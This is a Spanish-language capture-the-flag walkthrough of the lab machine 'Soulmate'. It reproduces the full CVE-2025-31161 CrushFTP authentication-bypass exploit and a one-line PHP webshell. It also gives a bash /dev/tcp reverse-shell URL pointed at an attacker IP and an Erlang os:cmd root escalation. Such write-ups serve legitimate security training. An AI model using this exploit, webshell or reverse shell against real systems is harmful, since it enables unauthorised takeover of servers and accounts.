### 1. Enumeración inicial

Esta máquina solo tiene abiertos los **puertos 80 y 22, correspondientes a HTTP y SSH**.

Vamos a enumerar el servicio web. Añadimos el dominio `soulmate.htb` al **/etc/hosts** y entramos al sitio web desde el navegador. 

De primeras la página web tiene una función de **login** y **register**, registraremos un usuario propio. 

Existe una función de File Upload, **pero tiene una sanitización bastante robusta**, una forma rápida de comprobarlo es probando a subir un archivo con extensión .aaa, y probando diferentes métodos de File Upload Bypass, nos daremos cuenta casi al instante de que usa una lista blanca de extensiones, lo que significa que no perdamos tiempo tratando de subir una de las extensiones que no estén figuradas.

---
### 2. Enumeración web — Subdominios

Haciendo fuzzing de la máquina me encuentro que tiene un servicio/aplicativo web **FTP** corriendo por detrás en un subdominio:

```bash
ffuf -w /home/abra/Documentos/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u 'http://soulmate.htb/' -H "Host: FUZZ.soulmate.htb" -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://soulmate.htb/
 :: Wordlist         : FUZZ: /home/abra/Documentos/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.soulmate.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 100ms]
:: Progress: [19966/19966] :: Job [1/1] :: 554 req/sec :: Duration: [0:00:53] :: Errors: 0 ::
```

Añadimos al **/etc/hosts** el subdominio `ftp.soulmate.htb` y vamos a ver que contiene. Tenemos un aplicativo **CrushFTP** que solamente contempla un panel de login, no sabemos la versión que corre por detrás, y la utilidad de resetear contraseña está inactiva.

---
### 3. Explotación de CrushFTP — CVE-2025-31161

Aunque no sepamos la versión exacta **tiene un CVE documentado únicamente** por lo que merece la pena probar la vulnerabilidad **CVE 2025-31161 - Authentication Bypass**, con el cual **podremos crear un nuevo usuario en CrushFTP**. 

Es un fallo que nos permite a atacantes remotos **eludir por completo la autenticación** y tomar control de una cuenta conocida como por ejemplo, el **usuario default** `crushadmin` **sin necesidad de contraseña.**

Vamos a usar el siguiente PoC:
https://github.com/Immersive-Labs-Sec/CVE-2025-31161/blob/main/cve-2025-31161.py

```python
# Copyright (C) 2025 Kev Breen,Ben McCarthy Immersive
# https://github.com/Immersive-Labs-Sec/CVE-2025-31161
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import requests
from argparse import ArgumentParser


def exploit(target_host, port, target_user, new_user, password):
    print("[+] Preparing Payloads")
    
    # First request details
    warm_up_url = f"http://{target_host}:{port}/WebInterface/function/"
    create_user_url = f"http://{target_host}:{port}/WebInterface/function/"


    headers = {
        "Cookie": "currentAuth=31If; CrushAuth=1744110584619_p38s3LvsGAfk4GvVu0vWtsEQEv31If",
        "Authorization": "AWS4-HMAC-SHA256 Credential=crushadmin/",
        "Connection": "close",
    }

    payload = {
        "command": "setUserItem",
        "data_action": "replace",
        "serverGroup": "MainUsers",
        "username": new_user,
        "user": f'<?xml version="1.0" encoding="UTF-8"?><user type="properties"><user_name>{new_user}</user_name><password>{password}</password><extra_vfs type="vector"></extra_vfs><version>1.0</version><root_dir>/</root_dir><userVersion>6</userVersion><max_logins>0</max_logins><site>(SITE_PASS)(SITE_DOT)(SITE_EMAILPASSWORD)(CONNECT)</site><created_by_username>{target_user}</created_by_username><created_by_email></created_by_email><created_time>1744120753370</created_time><password_history></password_history></user>',
        "xmlItem": "user",
        "vfs_items": '<?xml version="1.0" encoding="UTF-8"?><vfs type="vector"></vfs>',
        "permissions": '<?xml version="1.0" encoding="UTF-8"?><VFS type="properties"><item name="/">(read)(view)(resume)</item></VFS>',
        "c2f": "31If"
    }

    # Execute requests sequentially
    print("  [-] Warming up the target")
    # we jsut fire a request and let it time out. 
    try:
        warm_up_request = requests.get(warm_up_url, headers=headers, timeout=20)
        if warm_up_request.status_code == 200:
            print("  [-] Target is up and running")
    except requests.exceptions.ConnectionError:
        print("  [-] Request timed out, continuing with exploit")


    print("[+] Sending Account Create Request")
    create_user_request = requests.post(create_user_url, headers=headers, data=payload)
    if create_user_request.status_code != 200:
        print("  [-] Failed to send request")
        print("  [+] Status code:", create_user_request.status_code)
    if '<response_status>OK</response_status>' in create_user_request.text:
        print("  [!] User created successfully")



if __name__ == "__main__":
    parser = ArgumentParser(description="Exploit CVE-2025-31161 to create a new account")
    parser.add_argument("--target_host", help="Target host")
    parser.add_argument("--port", type=int, help="Target port", default=8080)
    parser.add_argument("--target_user", help="Target user", default="crushadmin")
    parser.add_argument("--new_user", help="New user to create", default="AuthBypassAccount")
    parser.add_argument("--password", help="Password for the new user", default="CorrectHorseBatteryStaple")

    args = parser.parse_args()

    if not args.target_host:
        print("  [-] Target host not specified")
        parser.print_help()
        exit(1)

    exploit(
        target_host=args.target_host,
        port=args.port,
        target_user=args.target_user,
        new_user=args.new_user,
        password=args.password
    )

    print(f"[+] Exploit Complete you can now login with\n   [*] Username: {args.new_user}\n   [*] Password: {args.password}.")

```

Necesitamos apuntar a un usuario existente en el servidor para ejecutar el script, como ya mencionamos el usuario default de CrushFTP es `crushadmin` por lo que procedemos a probar a crear nuestro propio usuario aprovechando a **crushadmin**:

```bash
python3 exploit.py --target_host ftp.soulmate.htb --port 80 --target_user crushadmin --new_user rootAbra --password 123456
[+] Preparing Payloads
  [-] Warming up the target
[+] Sending Account Create Request
  [!] User created successfully
[+] Exploit Complete you can now login with
   [*] Username: rootAbra
   [*] Password: 123456.
```

Vemos que el exploit se ejecutó correctamente, tenemos **acceso como administrador**. 

---
### 4. Acceso al FTP y webshell

En el panel general vemos que **podemos cambiar las contraseñas de los usuarios en el aplicativo**. Vamos a cambiársela a **ben**, e iniciaremos sesión con él, veremos que aloja **archivos de producción**.

![[1]](img/1.png)

Como su repositorio FTP está sincronizado con la web de producción **si subimos un archivo PHP malicioso con ben, deberíamos poder ejecutarlo desde el sitio web principal**:

```php
<?php system($_GET['cmd']); ?>
```

![[2]](img/2.png)

Si accedemos al archivo **desde la raíz de soulmate.htb** vemos que tenemos acceso al archivo subido y que nos interpreta el código:

![[3]](img/3.png)

Ahora solo debemos mandarnos una reverse shell a nuestra máquina de atacante (recuerden cambiar la IP y el puerto correspondiente al de escucha **de vuestra máquina de atacante**):

```url
http://soulmate.htb/sumadre123cmd.php?cmd=bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.45%2F4444+0%3E%261%22
```

![[4]](img/4.png)

Tenemos acceso como usuario `www-data`, ahora toca escalar a algún usuario local de la máquina. 

---
### 5. Escalada a usuario ben

Enumerando la máquina, nos encontramos ejecutando `ps -faux` que el usuario root está ejecutando **un servicio erlang personalizado** `/usr/local/lib/erlang_login/start.escript`.

```bash
...

root        1084  0.0  1.7 2254276 70840 ?       Ssl  11:55   0:15 /usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlan
root        1154  0.0  0.0   2784   936 ?        Ss   11:55   0:00  \_ erl_child_setup 1024
root        1091  0.0  0.0   6896  2900 ?        Ss   11:55   0:00 /usr/sbin/cron -f -P
root        1123  0.0  0.1  10344  4036 ?        S    11:55   0:00  \_ /usr/sbin/CRON -f -P

...
```

![[5]](img/5.png)

Si vemos el contenido de `/usr/local/lib/erlang_login/start.escript` nos encontramos lo siguiente:

```bash
cat /usr/local/lib/erlang_login/start.escript

#!/usr/bin/env escript
%%! -sname ssh_runner

main(_) ->
    application:start(asn1),
    application:start(crypto),
    application:start(public_key),
    application:start(ssh),

    io:format("Starting SSH daemon with logging...~n"),

    case ssh:daemon(2222, [
        {ip, {127,0,0,1}},
        {system_dir, "/etc/ssh"},

        {user_dir_fun, fun(User) ->
            Dir = filename:join("/home", User),
            io:format("Resolving user_dir for ~p: ~s/.ssh~n", [User, Dir]),
            filename:join(Dir, ".ssh")
        end},

        {connectfun, fun(User, PeerAddr, Method) ->
            io:format("Auth success for user: ~p from ~p via ~p~n",
                      [User, PeerAddr, Method]),
            true
        end},

        {failfun, fun(User, PeerAddr, Reason) ->
            io:format("Auth failed for user: ~p from ~p, reason: ~p~n",
                      [User, PeerAddr, Reason]),
            true
        end},

        {auth_methods, "publickey,password"},

        {user_passwords, [{"ben", "HouseH0ldings998"}]},
        {idle_time, infinity},
        {max_channels, 10},
        {max_sessions, 10},
        {parallel_login, true}
    ]) of
        {ok, _Pid} ->
            io:format("SSH daemon running on port 2222. Press Ctrl+C to exit.~n");
        {error, Reason} ->
            io:format("Failed to start SSH daemon: ~p~n", [Reason])
    end,

    receive
        stop -> ok
    end.
```

**Obtenemos credenciales para un usuario local**: `ben:HouseH0ldings998`. Vamos a iniciar sesión con dicho usuario:

```bash
www-data@soulmate:/$ su ben
Password: 
ben@soulmate:/$ whoami
ben
ben@soulmate:/$ cd
ben@soulmate:~$ ls -l
total 4
-rw-r----- 1 root ben 33 Nov 16 11:56 user.txt
```

Con esto obtenemos la user flag, toca obtener la root flag.

---
### 6. Escalada de privilegios a root — Erlang Shell

Vamos con la enumeración de la máquina con el usuario `ben`. No dispone de privilegios sudo. Analizando el script donde pillamos las credenciales de Ben, veremos que se trata de un servicio ssh interno (**localhost**) `customizado` servido por el puerto 2222, vamos a conectarnos a ver que contiene:

```bash
ben@soulmate:~$ ssh -o StrictHostKeyChecking=no -p 2222 ben@127.0.0.1
ben@127.0.0.1's password: 
Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
(ssh_runner@soulmate)1> 
```

Pone que es un `Eshell V15.2.5`, vemos de primeras que su sintaxis para ejecutar comandos es muy rara, como este servicio por lo que vimos antes con `ps -faux` lo corre el usuario **root** capaz podemos aprovecharlo **para escalar privilegios**.

```bash
(ssh_runner@soulmate)2> help().

** shell internal commands **
b()        -- display all variable bindings
e(N)       -- repeat the expression in query <N>
f()        -- forget all variable bindings
f(X)       -- forget the binding of variable X
h()        -- history
h(Mod)     -- help about module
h(Mod,Func)-- help about function in module
h(Mod,Func,Arity) -- help about function with arity in module
ht(Mod)    -- help about a module's types
ht(Mod,Type) -- help about type in module
ht(Mod,Type,Arity) -- help about type with arity in module
hcb(Mod)    -- help about a module's callbacks
hcb(Mod,CB) -- help about callback in module
hcb(Mod,CB,Arity) -- help about callback with arity in module
history(N) -- set how many previous commands to keep
results(N) -- set how many previous command results to keep
catch_exception(B) -- how exceptions are handled
v(N)       -- use the value of query <N>
rd(R,D)    -- define a record
rf()       -- remove all record information
rf(R)      -- remove record information about R
rl()       -- display all record information
rl(R)      -- display record information about R
rp(Term)   -- display Term using the shell's record information
rr(File)   -- read record information from File (wildcards allowed)
rr(F,R)    -- read selected record information from file(s)
rr(F,R,O)  -- read selected record information with options
lf()       -- list locally defined functions
lt()       -- list locally defined types
lr()       -- list locally defined records
ff()       -- forget all locally defined functions
ff({F,A})  -- forget locally defined function named as atom F and arity A
tf()       -- forget all locally defined types
tf(T)      -- forget locally defined type named as atom T
fl()       -- forget all locally defined functions, types and records
save_module(FilePath) -- save all locally defined functions, types and records to a file
bt(Pid)    -- stack backtrace for a process
c(Mod)     -- compile and load module or file <Mod>
cd(Dir)    -- change working directory
flush()    -- flush any messages sent to the shell
help()     -- help info
h(M)       -- module documentation
h(M,F)     -- module function documentation
h(M,F,A)   -- module function arity documentation
i()        -- information about the system
ni()       -- information about the networked system
i(X,Y,Z)   -- information about pid <X,Y,Z>
l(Module)  -- load or reload module
lm()       -- load all modified modules
lc([File]) -- compile a list of Erlang modules
ls()       -- list files in the current directory
ls(Dir)    -- list files in directory <Dir>
m()        -- which modules are loaded
m(Mod)     -- information about module <Mod>
mm()       -- list all modified modules
memory()   -- memory allocation information
memory(T)  -- memory allocation information of type <T>
nc(File)   -- compile and load code in <File> on all nodes
nl(Module) -- load module on all nodes
pid(X,Y,Z) -- convert X,Y,Z to a Pid
pwd()      -- print working directory
q()        -- quit - shorthand for init:stop()
regs()     -- information about registered processes
nregs()    -- information about all registered processes
uptime()   -- print node uptime
xm(M)      -- cross reference check a module
y(File)    -- generate a Yecc parser
** commands in module i (interpreter interface) **
ih()       -- print help for the i module
true

...
```

Entre las acciones que podemos ejecutar específicas de `Eshell`, con `os:cmd` podemos ejecutar comandos de sistema normales, probemos un **whoami**:

```bash
(ssh_runner@soulmate)3> os:cmd("whoami").

"root\n"
```

**Confirmamos que la Eshell la esta corriendo root**, es efectivamente quién está sirviendo el servicio ssh personalizado. Podemos ejecutar el siguiente comando para obtener la root flag:

```bash
(ssh_runner@soulmate)4> os:cmd("cat /root/root.txt").
```

Y listo, con esto tenemos la máquina vulnerada con éxito.